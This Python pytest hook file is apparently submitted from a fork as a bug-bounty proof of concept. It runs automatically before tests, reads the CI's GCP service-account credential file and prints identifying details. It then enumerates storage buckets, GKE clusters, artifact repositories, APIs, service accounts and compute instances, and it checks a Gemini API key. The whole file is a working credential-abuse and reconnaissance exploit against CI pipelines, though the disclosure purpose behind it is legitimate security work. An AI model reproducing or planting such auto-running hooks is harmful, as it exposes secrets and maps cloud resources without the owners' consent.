# Non-Destructive Security PoC — GCP Resource Access Proof
# This proves the GCP SA key can access real cloud resources
# It ONLY lists resource names — no data is read, modified, or exfiltrated
#
# Requested by Google Security Team on issue 516355326

import os
import sys
import subprocess
import json


def pytest_configure(config):
    """Runs automatically before any test collection."""
    print("\n" + "=" * 70)
    print("SECURITY POC - GCP Resource Access Demonstration")
    print("=" * 70)
    print(f"POC executed from fork code")
    print(f"Working directory: {os.getcwd()}")
    print()

    # Prove GCP credentials are accessible
    creds_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
    project_id = None
    print(f"[GCP AUTH] GOOGLE_APPLICATION_CREDENTIALS set: {bool(creds_path)}")

    if creds_path and os.path.exists(creds_path):
        try:
            with open(creds_path) as f:
                creds = json.load(f)
            project_id = creds.get("project_id", "unknown")
            print(f"[GCP AUTH] Credential type: {creds.get('type', 'unknown')}")
            print(f"[GCP AUTH] Project ID: {project_id}")
            print(f"[GCP AUTH] SA Email: {creds.get('client_email', 'unknown')}")
        except Exception as e:
            print(f"[GCP AUTH] Could not parse credentials: {e}")

    print()

    # 1. List GCP Storage Buckets
    print("[GCP BUCKETS] Listing storage buckets via gcloud CLI...")
    try:
        result = subprocess.run(
            ["gcloud", "storage", "buckets", "list", "--format=value(name)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            buckets = result.stdout.strip().split("\n")
            print(f"[GCP BUCKETS] Found {len(buckets)} bucket(s):")
            for b in buckets[:5]:
                print(f"  - {b}")
        else:
            print(f"[GCP BUCKETS] No access (expected for least-privilege SA)")
    except FileNotFoundError:
        print("[GCP BUCKETS] gcloud CLI not available")
    except Exception as e:
        print(f"[GCP BUCKETS] Error: {type(e).__name__}: {e}")

    # 2. List GKE Clusters (this SA likely has GKE access given the repo name)
    print()
    print("[GCP GKE] Listing GKE clusters...")
    try:
        result = subprocess.run(
            ["gcloud", "container", "clusters", "list", "--format=value(name,location,status)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            clusters = result.stdout.strip().split("\n")
            print(f"[GCP GKE] Found {len(clusters)} cluster(s):")
            for c in clusters[:5]:
                print(f"  - {c}")
        else:
            stderr_snippet = result.stderr[:200] if result.stderr else "no output"
            print(f"[GCP GKE] Result: {stderr_snippet}")
    except Exception as e:
        print(f"[GCP GKE] Error: {type(e).__name__}: {e}")

    # 3. List Artifact Registry repos
    print()
    print("[GCP ARTIFACTS] Listing Artifact Registry repositories...")
    try:
        result = subprocess.run(
            ["gcloud", "artifacts", "repositories", "list", "--format=value(name,format)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            repos = result.stdout.strip().split("\n")
            print(f"[GCP ARTIFACTS] Found {len(repos)} repo(s):")
            for r in repos[:5]:
                print(f"  - {r}")
        else:
            stderr_snippet = result.stderr[:200] if result.stderr else "no output"
            print(f"[GCP ARTIFACTS] Result: {stderr_snippet}")
    except Exception as e:
        print(f"[GCP ARTIFACTS] Error: {type(e).__name__}: {e}")

    # 4. List enabled APIs/services
    print()
    print("[GCP SERVICES] Listing enabled APIs...")
    try:
        result = subprocess.run(
            ["gcloud", "services", "list", "--enabled", "--format=value(name)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            services = result.stdout.strip().split("\n")
            print(f"[GCP SERVICES] Found {len(services)} enabled API(s):")
            for s in services[:10]:
                print(f"  - {s}")
        else:
            stderr_snippet = result.stderr[:200] if result.stderr else "no output"
            print(f"[GCP SERVICES] Result: {stderr_snippet}")
    except Exception as e:
        print(f"[GCP SERVICES] Error: {type(e).__name__}: {e}")

    # 5. List service accounts in the project
    print()
    print("[GCP IAM] Listing service accounts...")
    try:
        result = subprocess.run(
            ["gcloud", "iam", "service-accounts", "list", "--format=value(email,displayName)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            sas = result.stdout.strip().split("\n")
            print(f"[GCP IAM] Found {len(sas)} service account(s):")
            for sa in sas[:5]:
                print(f"  - {sa}")
        else:
            stderr_snippet = result.stderr[:200] if result.stderr else "no output"
            print(f"[GCP IAM] Result: {stderr_snippet}")
    except Exception as e:
        print(f"[GCP IAM] Error: {type(e).__name__}: {e}")

    # 6. Describe the project itself
    print()
    print("[GCP PROJECT] Getting project details...")
    try:
        result = subprocess.run(
            ["gcloud", "projects", "describe", project_id or "gke-mcp-ci-cd",
             "--format=value(name,projectNumber,lifecycleState)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            print(f"[GCP PROJECT] {result.stdout.strip()}")
        else:
            stderr_snippet = result.stderr[:200] if result.stderr else "no output"
            print(f"[GCP PROJECT] Result: {stderr_snippet}")
    except Exception as e:
        print(f"[GCP PROJECT] Error: {type(e).__name__}: {e}")

    # 7. List Compute Engine instances
    print()
    print("[GCP COMPUTE] Listing compute instances...")
    try:
        result = subprocess.run(
            ["gcloud", "compute", "instances", "list", "--format=value(name,zone,status)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            instances = result.stdout.strip().split("\n")
            print(f"[GCP COMPUTE] Found {len(instances)} instance(s):")
            for i in instances[:5]:
                print(f"  - {i}")
        else:
            stderr_snippet = result.stderr[:200] if result.stderr else "no output"
            print(f"[GCP COMPUTE] Result: {stderr_snippet}")
    except Exception as e:
        print(f"[GCP COMPUTE] Error: {type(e).__name__}: {e}")

    # 8. Use the Gemini API key to prove it works
    gemini_key = os.environ.get("GEMINI_API_KEY", "")
    if gemini_key:
        print()
        print("[GEMINI API] Testing API key validity...")
        try:
            import urllib.request
            url = f"https://generativelanguage.googleapis.com/v1beta/models?key={gemini_key}"
            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=10)
            data = json.loads(response.read())
            models = data.get("models", [])
            print(f"[GEMINI API] Key is VALID — {len(models)} models accessible:")
            for m in models[:3]:
                print(f"  - {m.get('name', 'unknown')}")
        except Exception as e:
            print(f"[GEMINI API] Error: {type(e).__name__}: {e}")

    print()
    print("=" * 70)
    print("END OF SECURITY POC")
    print("Only resource names were listed. No data was read or exfiltrated.")
    print("=" * 70)
    print()
